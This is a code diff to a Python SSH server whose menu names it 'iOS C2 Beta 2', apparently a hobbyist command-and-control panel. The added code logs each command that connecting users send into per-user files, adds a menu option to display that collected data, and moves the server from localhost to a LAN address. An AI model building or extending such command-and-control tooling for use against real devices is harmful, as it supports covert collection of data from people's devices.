@@ -22,6 +22,18 @@ class CustomSSHServerInterface(ServerInterface):
     def get_allowed_auths(self, username):
         return 'password'
 
+    def check_channel_exec_request(self, channel, command):
+        username = channel.get_transport().get_username()
+        data_file = Path(f"C:/Users/glenn/Desktop/iOS/C2/userdata/{username}_data.txt")
+
+
+        with open(data_file, "a") as f:
+            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"{timestamp}: {command.decode('utf-8')}\n")
+
+        return True
+
+
 
 class SSHRequestHandler(BaseRequestHandler):
     def handle(self):
@@ -33,6 +45,17 @@ class SSHRequestHandler(BaseRequestHandler):
         except Exception as e:
             print(f"Error: {e}")
 
+def get_user_data(username):
+    data_file = Path(f"C:/Users/glenn/Desktop/iOS/C2/userdata/{username}_data.txt")
+    data = []
+
+    if data_file.exists():
+        with open(data_file, "r") as f:
+            for line in f.readlines():
+                timestamp, command = line.strip().split(": ", 1)
+                data.append((timestamp, command))
+
+    return data
 
 def read_user_table():
     user_table_file = Path("C:/Users/glenn/Desktop/iOS/C2/user_table.txt")
@@ -84,7 +107,7 @@ def main():
     global host_key
     host_key = RSAKey.generate(bits=2048)
 
-    server_address = ("localhost", 22)
+    server_address = ("192.168.50.120", 22)
     ssh_server = ThreadingTCPServer(server_address, SSHRequestHandler)
     ssh_server_thread = threading.Thread(target=ssh_server.serve_forever)
     ssh_server_thread.daemon = True
@@ -118,8 +141,8 @@ def main():
            ██▀                                    
                            
              """)
-        print("       ")
         print("iOS C2 Beta 2")
+        print("       ")
         print("1. SSH user generation")
         print("2. Display users and passwords")
         print("3. User management")
@@ -157,8 +180,13 @@ def main():
                 if 0 <= index < len(users):
                     username, _ = users[index]
                     print(f"\nData sent by user {username}:")
+
+                    for timestamp, command in get_user_data(username):
+                        print(f"{timestamp}: {command}")
+
+                    input("\nPress Enter to continue...")
         elif choice == "4":
-            print("Listening for incoming traffic...")
+            print("\nListening for incoming traffic...")
             print("Type 'back' to return to the main menu.")
             while True:
                 command = input()
